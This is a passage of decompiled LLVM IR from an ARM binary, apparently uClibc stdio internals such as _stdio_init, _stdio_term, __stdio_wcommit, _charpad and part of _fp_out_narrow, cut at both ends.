  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_b7f4._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_b79c, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_b738, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b700, { 1, 2, 0 }
}

define i32 @function_baf0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_baf0:
  %v0_baf0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_baf0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_baf0
  %v5_baf0 = sdiv i32 %arg2, 16
  %v6_baf0 = and i32 %v5_baf0, %arg1
  %v5_baf4 = sdiv i32 %arg2, 256
  %v6_baf4 = and i32 %v6_baf0, %v5_baf4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_baf0, %bb
  %v10_baf8 = phi i32 [ %arg1, %dec_label_pc_baf0 ], [ %v6_baf4, %bb ]
  ret i32 %v10_baf8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_bb28 = call i32 @__aeabi_read_tp()
  %v3_bb2c = load i16, i16* @global_var_23164.175, align 2
  %v4_bb2c = sext i16 %v3_bb2c to i32
  store i32 %v4_bb2c, i32* @r3, align 4
  store i32 %v0_bb28, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_bb38 = add i32 %v4_bb2c, %v0_bb28
  %v3_bb38 = inttoptr i32 %v2_bb38 to i32*
  %v4_bb38 = load i32, i32* %v3_bb38, align 4
  store i32 %v4_bb38, i32* @r6, align 4
  %v1_bb3c = call i32 @isatty(i32 0)
  %v2_bb44 = icmp eq i32 %v1_bb3c, 0
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r4, align 4
  br i1 %v2_bb44, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_bb50 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 332) to i16*), align 4
  %v7_bb50 = zext i16 %v5_bb50 to i32
  %v2_bb54 = xor i32 %v7_bb50, 256
  store i32 %v2_bb54, i32* @r3, align 4
  %v2_bb58 = trunc i32 %v2_bb54 to i16
  store i16 %v2_bb58, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 332) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_bb60 = call i32 @isatty(i32 1)
  %v2_bb64 = icmp eq i32 %v1_bb60, 0
  br i1 %v2_bb64, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_bb6c = load i32, i32* @r4, align 4
  %v2_bb70 = add i32 %v1_bb6c, 400
  %v3_bb70 = inttoptr i32 %v2_bb70 to i16*
  %v4_bb70 = load i16, i16* %v3_bb70, align 2
  %v2_bb74 = xor i16 %v4_bb70, 256
  store i16 %v2_bb74, i16* %v3_bb70, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_bb80 = load i16, i16* @global_var_23164.175, align 2
  %v4_bb80 = sext i16 %v3_bb80 to i32
  %v0_bb84 = load i32, i32* @r6, align 4
  %v1_bb84 = load i32, i32* @r5, align 4
  %v3_bb84 = add i32 %v1_bb84, %v4_bb80
  %v4_bb84 = inttoptr i32 %v3_bb84 to i32*
  store i32 %v0_bb84, i32* %v4_bb84, align 4
  ret i32 %v1_bb60

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_bba0 = load i32, i32* @r4, align 4
  store i32 %v3_bba0, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -38152), i32* %r3.global-to-local, align 4
  %v2_bbb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -38152) to i32*), align 4
  store i32 %v2_bbb4, i32* %r0.global-to-local, align 4
  %v5_bbb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -38148) to i32*), align 4
  store i32 %v5_bbb4, i32* %r1.global-to-local, align 4
  %v8_bbb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -38144) to i32*), align 4
  %v2_bbbc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_bbbc, i32* %r3.global-to-local, align 4
  store i32 %v2_bbb4, i32* %stack_var_-44, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v4_bbc8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 160) to i32*), align 4
  store i32 %v2_bbb4, i32* %r0.global-to-local, align 4
  store i32 %v5_bbb4, i32* %r1.global-to-local, align 4
  store i32 %v8_bbb4, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -38164), i32* %r3.global-to-local, align 4
  %v1_bbd8 = inttoptr i32 %v4_bbc8 to i32*
  store i32 %v2_bbb4, i32* %v1_bbd8, align 4
  %v3_bbd8 = add i32 %v4_bbc8, 4
  %v4_bbd8 = inttoptr i32 %v3_bbd8 to i32*
  %v5_bbd8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_bbd8, i32* %v4_bbd8, align 4
  %v6_bbd8 = add i32 %v4_bbc8, 8
  %v7_bbd8 = inttoptr i32 %v6_bbd8 to i32*
  %v8_bbd8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_bbd8, i32* %v7_bbd8, align 4
  %v0_bbdc = load i32, i32* %r3.global-to-local, align 4
  %v1_bbdc = inttoptr i32 %v0_bbdc to i32*
  %v2_bbdc = load i32, i32* %v1_bbdc, align 4
  store i32 %v2_bbdc, i32* %r0.global-to-local, align 4
  %v3_bbdc = add i32 %v0_bbdc, 4
  %v4_bbdc = inttoptr i32 %v3_bbdc to i32*
  %v5_bbdc = load i32, i32* %v4_bbdc, align 4
  store i32 %v5_bbdc, i32* %r1.global-to-local, align 4
  %v6_bbdc = add i32 %v0_bbdc, 8
  %v7_bbdc = inttoptr i32 %v6_bbdc to i32*
  %v8_bbdc = load i32, i32* %v7_bbdc, align 4
  %v2_bbe0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_bbe0, i32* %r3.global-to-local, align 4
  store i32 %v2_bbdc, i32* %stack_var_-56, align 4
  store i32 84, i32* %r2.global-to-local, align 4
  %v0_bbec = load i32, i32* %r7.global-to-local, align 4
  %v2_bbec = add i32 %v0_bbec, 84
  %v3_bbec = inttoptr i32 %v2_bbec to i32*
  %v4_bbec = load i32, i32* %v3_bbec, align 4
  store i32 %v4_bbec, i32* %r1.global-to-local, align 4
  store i32 168, i32* %r2.global-to-local, align 4
  %v1_bbf4 = inttoptr i32 %v4_bbec to i32*
  %v2_bbf4 = load i32, i32* %v1_bbf4, align 4
  store i32 %v2_bbf4, i32* %r5.global-to-local, align 4
  %v2_bbf8 = add i32 %v0_bbec, 168
  %v3_bbf8 = inttoptr i32 %v2_bbf8 to i32*
  %v4_bbf8 = load i32, i32* %v3_bbf8, align 4
  store i32 %v2_bbdc, i32* %r0.global-to-local, align 4
  store i32 %v5_bbdc, i32* %r1.global-to-local, align 4
  store i32 %v8_bbdc, i32* %r2.global-to-local, align 4
  store i32 -38176, i32* %r3.global-to-local, align 4
  %v2_bc08 = add i32 %v0_bbec, -38176
  store i32 %v2_bc08, i32* %sl.global-to-local, align 4
  %v1_bc0c = inttoptr i32 %v4_bbf8 to i32*
  store i32 %v2_bbdc, i32* %v1_bc0c, align 4
  %v3_bc0c = add i32 %v4_bbf8, 4
  %v4_bc0c = inttoptr i32 %v3_bc0c to i32*
  %v5_bc0c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_bc0c, i32* %v4_bc0c, align 4
  %v6_bc0c = add i32 %v4_bbf8, 8
  %v7_bc0c = inttoptr i32 %v6_bc0c to i32*
  %v8_bc0c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_bc0c, i32* %v7_bc0c, align 4
  %v0_bc9c.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_bc9c16 = icmp eq i32 %v0_bc9c.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_bca418 = add i32 %v0_bc9c.pr, 56
  store i32 %v1_bca418, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_bc9c16, label %dec_label_pc_bcb0, label %dec_label_pc_bc14

dec_label_pc_bc14:                                ; preds = %entry, %.thread10
  %v0_bc14 = phi i32 [ %v3_bc98, %.thread10 ], [ %v0_bc9c.pr, %entry ]
  %v1_bc14 = add i32 %v0_bc14, 64
  %v2_bc14 = inttoptr i32 %v1_bc14 to i32*
  %v3_bc14 = load i32, i32* %v2_bc14, align 4
  store i32 %v3_bc14, i32* %r3.global-to-local, align 4
  %v0_bc18 = call i32 @__aeabi_read_tp()
  store i32 %v0_bc18, i32* %r0.global-to-local, align 4
  %v1_bc1c = add i32 %v0_bc18, -1168
  store i32 %v1_bc1c, i32* %r6.global-to-local, align 4
  %v3_bc20 = icmp uge i32 %v3_bc14, %v1_bc1c
  store i1 %v3_bc20, i1* %cpsr_c.global-to-local, align 1
  %v9_bc20 = icmp eq i32 %v3_bc14, %v1_bc1c
  br i1 %v9_bc20, label %.thread1, label %dec_label_pc_bc34

.thread1:                                         ; preds = %dec_label_pc_bc14
  %v1_bc24 = load i32, i32* %r5.global-to-local, align 4
  %v2_bc24 = add i32 %v1_bc24, 60
  %v3_bc24 = inttoptr i32 %v2_bc24 to i32*
  %v4_bc24 = load i32, i32* %v3_bc24, align 4
  %v2_bc28 = add i32 %v4_bc24, 1
  store i32 %v2_bc28, i32* %r3.global-to-local, align 4
  store i32 %v2_bc28, i32* %v3_bc24, align 4
  br label %.thread10

dec_label_pc_bc34:                                ; preds = %dec_label_pc_bc14, %dec_label_pc_bc40
  %v0_bc34 = load i32, i32* %r2.global-to-local, align 4
  %v1_bc34 = inttoptr i32 %v0_bc34 to i32*
  %v2_bc34 = load i32, i32* %v1_bc34, align 4
  store i32 %v2_bc34, i32* %r3.global-to-local, align 4
  %v1_bc38 = load i32, i32* %r4.global-to-local, align 4
  %v3_bc38 = icmp uge i32 %v2_bc34, %v1_bc38
  store i1 %v3_bc38, i1* %cpsr_c.global-to-local, align 1
  %v9_bc38 = icmp eq i32 %v2_bc34, %v1_bc38
  br i1 %v9_bc38, label %dec_label_pc_bc40, label %dec_label_pc_bc58

dec_label_pc_bc40:                                ; preds = %dec_label_pc_bc34
  store i32 %v2_bc34, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_bc50 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_bc50, label %dec_label_pc_bc54, label %dec_label_pc_bc34

dec_label_pc_bc54:                                ; preds = %dec_label_pc_bc40
  %v0_bc54 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_bc54, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_bc58

dec_label_pc_bc58:                                ; preds = %dec_label_pc_bc34, %dec_label_pc_bc54
  %v0_bc58 = phi i32 [ %v0_bc54, %dec_label_pc_bc54 ], [ %v2_bc34, %dec_label_pc_bc34 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_bc58 = icmp eq i32 %v0_bc58, 0
  %v2_bc64.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_bc58, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_bc58
  %v1_bc64 = load i32, i32* %r6.global-to-local, align 4
  %v3_bc64 = add i32 %v2_bc64.pre, 64
  %v4_bc64 = inttoptr i32 %v3_bc64 to i32*
  store i32 %v1_bc64, i32* %v4_bc64, align 4
  %v1_bc68 = load i32, i32* %r1.global-to-local, align 4
  %v2_bc68 = load i32, i32* %r5.global-to-local, align 4
  %v3_bc68 = add i32 %v2_bc68, 60
  %v4_bc68 = inttoptr i32 %v3_bc68 to i32*
  store i32 %v1_bc68, i32* %v4_bc68, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_bc58
  %v2_bc5c = add i32 %v2_bc64.pre, 8
  %v3_bc5c = inttoptr i32 %v2_bc5c to i32*
  %v4_bc5c = load i32, i32* %v3_bc5c, align 4
  store i32 %v4_bc5c, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_bc6c = add i32 %v2_bc64.pre, 20
  %v4_bc6c = inttoptr i32 %v3_bc6c to i32*
  store i32 %v4_bc5c, i32* %v4_bc6c, align 4
  %v1_bc70 = load i32, i32* %r2.global-to-local, align 4
  %v2_bc70 = trunc i32 %v1_bc70 to i16
  %v3_bc70 = load i32, i32* %r5.global-to-local, align 4
  %v4_bc70 = inttoptr i32 %v3_bc70 to i16*
  store i16 %v2_bc70, i16* %v4_bc70, align 2
  %v1_bc74 = load i32, i32* %r3.global-to-local, align 4
  %v2_bc74 = load i32, i32* %r5.global-to-local, align 4
  %v3_bc74 = add i32 %v2_bc74, 24
  %v4_bc74 = inttoptr i32 %v3_bc74 to i32*
  store i32 %v1_bc74, i32* %v4_bc74, align 4
  %v1_bc78 = load i32, i32* %r3.global-to-local, align 4
  %v2_bc78 = load i32, i32* %r5.global-to-local, align 4
  %v3_bc78 = add i32 %v2_bc78, 28
  %v4_bc78 = inttoptr i32 %v3_bc78 to i32*
  store i32 %v1_bc78, i32* %v4_bc78, align 4
  %v1_bc7c = load i32, i32* %r3.global-to-local, align 4
  %v2_bc7c = load i32, i32* %r5.global-to-local, align 4
  %v3_bc7c = add i32 %v2_bc7c, 16
  %v4_bc7c = inttoptr i32 %v3_bc7c to i32*
  store i32 %v1_bc7c, i32* %v4_bc7c, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_bc80 = load i32, i32* %sl.global-to-local, align 4
  %v1_bc80 = inttoptr i32 %v0_bc80 to i32*
  %v2_bc80 = load i32, i32* %v1_bc80, align 4
  store i32 %v2_bc80, i32* %r0.global-to-local, align 4
  %v3_bc80 = add i32 %v0_bc80, 4
  %v4_bc80 = inttoptr i32 %v3_bc80 to i32*
  %v5_bc80 = load i32, i32* %v4_bc80, align 4
  store i32 %v5_bc80, i32* %r1.global-to-local, align 4
  %v6_bc80 = add i32 %v0_bc80, 8
  %v7_bc80 = inttoptr i32 %v6_bc80 to i32*
  %v8_bc80 = load i32, i32* %v7_bc80, align 4
  store i32 %v8_bc80, i32* %r2.global-to-local, align 4
  %v1_bc88 = load i32, i32* %r5.global-to-local, align 4
  %v2_bc88 = add i32 %v1_bc88, 52
  %v3_bc88 = inttoptr i32 %v2_bc88 to i32*
  store i32 1, i32* %v3_bc88, align 4
  %v0_bc8c = load i32, i32* %r5.global-to-local, align 4
  %v1_bc8c = add i32 %v0_bc8c, 56
  store i32 %v1_bc8c, i32* %r3.global-to-local, align 4
  %v2_bc90 = load i32, i32* %r0.global-to-local, align 4
  %v1_bc94 = inttoptr i32 %v1_bc8c to i32*
  store i32 %v2_bc90, i32* %v1_bc94, align 4
  %v3_bc94 = add i32 %v0_bc8c, 60
  %v4_bc94 = inttoptr i32 %v3_bc94 to i32*
  %v5_bc94 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_bc94, i32* %v4_bc94, align 4
  %v6_bc94 = add i32 %v0_bc8c, 64
  %v7_bc94 = inttoptr i32 %v6_bc94 to i32*
  %v8_bc94 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_bc94, i32* %v7_bc94, align 4
  %v0_bc98 = load i32, i32* %r5.global-to-local, align 4
  %v1_bc98 = add i32 %v0_bc98, 32
  %v2_bc98 = inttoptr i32 %v1_bc98 to i32*
  %v3_bc98 = load i32, i32* %v2_bc98, align 4
  store i32 %v3_bc98, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_bc9c = icmp eq i32 %v3_bc98, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_bca4 = add i32 %v3_bc98, 56
  store i32 %v1_bca4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_bc9c, label %dec_label_pc_bcb0, label %dec_label_pc_bc14

dec_label_pc_bcb0:                                ; preds = %.thread10, %entry
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_bcb4 = load i32, i32* %r7.global-to-local, align 4
  %v2_bcb4 = add i32 %v0_bcb4, 84
  %v3_bcb4 = inttoptr i32 %v2_bcb4 to i32*
  %v4_bcb4 = load i32, i32* %v3_bcb4, align 4
  store i32 %v4_bcb4, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_bcb4 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_bcd414 = icmp eq i32 %storemerge12, 0
  br i1 %v2_bcd414, label %dec_label_pc_bcdc, label %dec_label_pc_bcc0

dec_label_pc_bcc0:                                ; preds = %dec_label_pc_bcb0, %dec_label_pc_bcd4
  %v1_bcc8 = phi i32 [ %storemerge, %dec_label_pc_bcd4 ], [ %storemerge12, %dec_label_pc_bcb0 ]
  %v1_bcc0 = inttoptr i32 %v1_bcc8 to i16*
  %v2_bcc0 = load i16, i16* %v1_bcc0, align 2
  %v3_bcc0 = zext i16 %v2_bcc0 to i32
  store i32 %v3_bcc0, i32* %r3.global-to-local, align 4
  %v1_bcc4 = and i32 %v3_bcc0, 64
  %v2_bcc4 = icmp eq i32 %v1_bcc4, 0
  br i1 %v2_bcc4, label %dec_label_pc_bcd4, label %bb39

bb39:                                             ; preds = %dec_label_pc_bcc0
  store i32 %v1_bcc8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bcd4

dec_label_pc_bcd4:                                ; preds = %dec_label_pc_bcc0, %bb39
  %v1_bccc = xor i1 %v2_bcc4, true
  call void @__pseudo_cond_branch(i1 %v1_bccc, i32 ptrtoint (i32* @global_var_bd04.226 to i32))
  %v0_bcd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_bcd0 = add i32 %v0_bcd0, 32
  %storemerge.in = inttoptr i32 %v1_bcd0 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_bcd4 = icmp eq i32 %storemerge, 0
  br i1 %v2_bcd4, label %dec_label_pc_bcdc, label %dec_label_pc_bcc0

dec_label_pc_bcdc:                                ; preds = %dec_label_pc_bcd4, %dec_label_pc_bcb0
  %v2_bce0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_bce0, i32* %r4.global-to-local, align 4
  %v1_bce4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_bce4

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_bc98, { 1, 2, 3, 0 }
  uselistorder i32 %v1_bc38, { 1, 0 }
  uselistorder i32 %v4_bbf8, { 2, 1, 0 }
  uselistorder i32 %v4_bbc8, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_bcd4, { 1, 0 }
  uselistorder label %dec_label_pc_bcc0, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bc58, { 1, 0 }
  uselistorder label %dec_label_pc_bc34, { 1, 0 }
  uselistorder label %dec_label_pc_bc14, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_bd04 = load i32, i32* @r4, align 4
  store i32 %v3_bd04, i32* %stack_var_-8, align 4
  %v0_bd08 = load i32, i32* @r0, align 4
  %v1_bd08 = add i32 %v0_bd08, 8
  %v2_bd08 = inttoptr i32 %v1_bd08 to i32*
  %v3_bd08 = load i32, i32* %v2_bd08, align 4
  store i32 %v3_bd08, i32* @r1, align 4
  %v1_bd0c = add i32 %v0_bd08, 16
  %v2_bd0c = inttoptr i32 %v1_bd0c to i32*
  %v3_bd0c = load i32, i32* %v2_bd0c, align 4
  %v9_bd10 = icmp eq i32 %v3_bd0c, %v3_bd08
  store i32 %v0_bd08, i32* %r4.global-to-local, align 4
  br i1 %v9_bd10, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_bd08, i32* %v2_bd0c, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_bd1c = xor i1 %v9_bd10, true
  call void @__pseudo_cond_branch(i1 %v1_bd1c, i32 ptrtoint (i32* @global_var_128e4.227 to i32))
  %v0_bd20 = load i32, i32* %r4.global-to-local, align 4
  %v1_bd20 = add i32 %v0_bd20, 8
  %v2_bd20 = inttoptr i32 %v1_bd20 to i32*
  %v3_bd20 = load i32, i32* %v2_bd20, align 4
  store i32 %v3_bd20, i32* @r3, align 4
  %v1_bd24 = add i32 %v0_bd20, 16
  %v2_bd24 = inttoptr i32 %v1_bd24 to i32*
  %v3_bd24 = load i32, i32* %v2_bd24, align 4
  %v2_bd28 = sub i32 %v3_bd24, %v3_bd20
  %v2_bd2c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_bd2c, i32* @r4, align 4
  ret i32 %v2_bd28

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_bd34 = load i32, i32* @r4, align 4
  %v6_bd34 = load i32, i32* @r5, align 4
  %v9_bd34 = load i32, i32* @r6, align 4
  %v12_bd34 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_bd40 = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_bd40, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_bd582 = icmp eq i32 %arg3, 0
  store i32 1, i32* @r1, align 4
  br i1 %v2_bd582, label %dec_label_pc_bd78, label %dec_label_pc_bd6c

dec_label_pc_bd54:                                ; preds = %dec_label_pc_bd6c
  %v1_bd54 = add i32 %v0_bd54, -1
  store i32 %v1_bd54, i32* @r4, align 4
  %v2_bd58 = icmp eq i32 %v1_bd54, 0
  store i32 1, i32* @r1, align 4
  %v0_bd64 = load i32, i32* @r7, align 4
  br i1 %v2_bd58, label %dec_label_pc_bd78.loopexit, label %dec_label_pc_bd6c

dec_label_pc_bd6c:                                ; preds = %entry, %dec_label_pc_bd54
  %v0_bd644 = phi i32 [ %v0_bd64, %dec_label_pc_bd54 ], [ %arg1, %entry ]
  %v3_bd6c = inttoptr i32 %v0_bd644 to i16*
  %v4_bd6c = call i32 @__stdio_fwrite(i32 %v10_bd40, i32 1, i16* %v3_bd6c)
  %v7_bd70 = icmp eq i32 %v4_bd6c, 1
  %v0_bd54 = load i32, i32* @r4, align 4
  br i1 %v7_bd70, label %dec_label_pc_bd54, label %dec_label_pc_bd78.loopexit

dec_label_pc_bd78.loopexit:                       ; preds = %dec_label_pc_bd54, %dec_label_pc_bd6c
  %v0_bd78.ph = phi i32 [ %v0_bd54, %dec_label_pc_bd6c ], [ 0, %dec_label_pc_bd54 ]
  %v1_bd78.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_bd78

dec_label_pc_bd78:                                ; preds = %dec_label_pc_bd78.loopexit, %entry
  %v1_bd78 = phi i32 [ 0, %entry ], [ %v1_bd78.pre, %dec_label_pc_bd78.loopexit ]
  %v0_bd78 = phi i32 [ 0, %entry ], [ %v0_bd78.ph, %dec_label_pc_bd78.loopexit ]
  %v2_bd78 = sub i32 %v1_bd78, %v0_bd78
  store i32 %v3_bd34, i32* @r4, align 4
  store i32 %v6_bd34, i32* @r5, align 4
  store i32 %v9_bd34, i32* @r6, align 4
  store i32 %v12_bd34, i32* @r7, align 4
  ret i32 %v2_bd78

; uselistorder directives
  uselistorder i32 %v1_bd54, { 1, 0 }
  uselistorder label %dec_label_pc_bd78.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_bd6c, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_bd88 = load i32, i32* @r4, align 4
  store i32 %v3_bd88, i32* %stack_var_-24, align 4
  %v6_bd88 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_bd90 = and i32 %arg2, 128
  %v2_bd90 = icmp eq i32 %v1_bd90, 0
  %v0_bd94 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_bd94, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_bd90, label %dec_label_pc_bde4thread-pre-split, label %dec_label_pc_bda8

dec_label_pc_bda8:                                ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_bdac = call i32 @strlen(i8* %arg4)
  store i32 %v3_bdac, i32* %r0.global-to-local, align 4
  %v1_bdb0 = load i32, i32* %r4.global-to-local, align 4
  %v2_bdb0 = sub i32 %v1_bdb0, %v3_bdac
  store i32 %v2_bdb0, i32* @r4, align 4
  store i32 %v3_bdac, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_bdb0, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_bdc4

.thread:                                          ; preds = %dec_label_pc_bda8
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_bde0

dec_label_pc_bdc4:                                ; preds = %dec_label_pc_bda8
  %v0_bdc4 = load i32, i32* @r5, align 4
  %v1_bdc4 = urem i32 %v0_bdc4, 128
  %v0_bdc8 = load i32, i32* @r8, align 4
  store i32 %v0_bdc8, i32* %r0.global-to-local, align 4
  %v3_bdd0 = trunc i32 %v1_bdc4 to i8
  %v4_bdd0 = call i32 @_charpad(i32 %v0_bdc8, i8 %v3_bdd0, i32 %v2_bdb0)
  store i32 %v4_bdd0, i32* %r0.global-to-local, align 4
  %v1_bdd4 = load i32, i32* @r4, align 4
  %v9_bdd4 = icmp eq i32 %v4_bdd0, %v1_bdd4
  store i32 %v4_bdd0, i32* %r5.global-to-local, align 4
  br i1 %v9_bdd4, label %dec_label_pc_bdc4.dec_label_pc_bde0_crit_edge, label %dec_label_pc_be00

dec_label_pc_bdc4.dec_label_pc_bde0_crit_edge:    ; preds = %dec_label_pc_bdc4
  %v0_bde0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_bde0

dec_label_pc_bde0:                                ; preds = %.thread, %dec_label_pc_bdc4.dec_label_pc_bde0_crit_edge
  %v0_bde0 = phi i32 [ %v0_bde0.pre, %dec_label_pc_bdc4.dec_label_pc_bde0_crit_edge ], [ %v3_bdac, %.thread ]
  store i32 %v0_bde0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bde4

dec_label_pc_bde4thread-pre-split:                ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_bde4

dec_label_pc_bde4:                                ; preds = %dec_label_pc_bde4thread-pre-split, %dec_label_pc_bde0
  %v5_bdf0 = phi i32 [ %arg3, %dec_label_pc_bde4thread-pre-split ], [ %v0_bde0, %dec_label_pc_bde0 ]
  %tmp14 = icmp slt i32 %v5_bdf0, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_bde4
  br label %bb15

bb:                                               ; preds = %dec_label_pc_bde4
  %v5_bdec = load i32, i32* @r7, align 4
  br label %bb15

